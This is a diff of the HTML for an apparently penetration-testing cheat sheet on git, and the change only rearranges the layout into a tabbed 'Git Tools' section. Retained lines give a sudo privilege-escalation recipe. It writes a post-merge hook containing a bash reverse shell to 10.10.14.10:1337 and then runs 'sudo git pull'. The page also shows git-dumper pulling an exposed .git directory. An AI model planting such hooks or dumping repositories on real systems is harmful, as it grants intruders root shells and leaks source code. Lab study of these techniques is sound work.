@@ -196,6 +196,7 @@
 
 <div class="content"><hr>
 <h3 id="basic-commands">Basic Commands</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show status</span>
 </span></span><span class="line"><span class="cl">git status
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Reset the current branch to a previous commit</span>
@@ -211,28 +212,40 @@
 </span></span><span class="line"><span class="cl">git diff <span class="o">[</span>a<span class="o">]</span> <span class="o">[</span>b<span class="o">]</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Show commit</span>
 </span></span><span class="line"><span class="cl">git show &lt;COMMIT_HASH&gt;
-</span></span></code></pre></div><br>
+</span></span></code></pre></div></div>
+<br>
+<hr>
+<h3 id="git-tools">Git Tools</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">git-dumper</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >git-bundle</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git-dumper http://10.10.11.10/.git result/
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/arthaud/git-dumper">Download git-dumper</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List all bundles</span>
+</span></span><span class="line"><span class="cl">find . -type f -exec file <span class="o">{}</span> <span class="se">\;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get bundle</span>
+</span></span><span class="line"><span class="cl">git clone -b master @hashed/ab/cd/&lt;HASH&gt;.bundle
+</span></span></code></pre></div></div>
+</div></p>
+<br>
 <hr>
 <h3 id="sudo">SUDO</h3>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Copy target project</span>
 </span></span><span class="line"><span class="cl">cp -r /var/www/html/project .
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Create a malicious post-merge</span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/bash\n\nbash -i &gt;&amp; /dev/tcp/10.10.14.10/1337 0&gt;&amp;1&#39;</span> &gt; ./project/.git/hooks/post-merge
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Run</span>
 </span></span><span class="line"><span class="cl">sudo /usr/bin/git pull
-</span></span></code></pre></div><p><small><em>Note: Make changes to the project to make the pull work</em></small></p>
-<hr>
-<h3 id="git-dumper">git-dumper</h3>
-<p><a href="https://github.com/arthaud/git-dumper">Download git-dumper</a></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git-dumper http://10.10.11.10/.git result/
-</span></span></code></pre></div><br>
-<hr>
-<h3 id="git-bundle">git-bundle</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List all bundles</span>
-</span></span><span class="line"><span class="cl">find . -type f -exec file <span class="o">{}</span> <span class="se">\;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get bundle</span>
-</span></span><span class="line"><span class="cl">git clone -b master @hashed/ab/cd/&lt;HASH&gt;.bundle
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+<p><small><em>Note: Make changes to the project to make the pull work</em></small></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
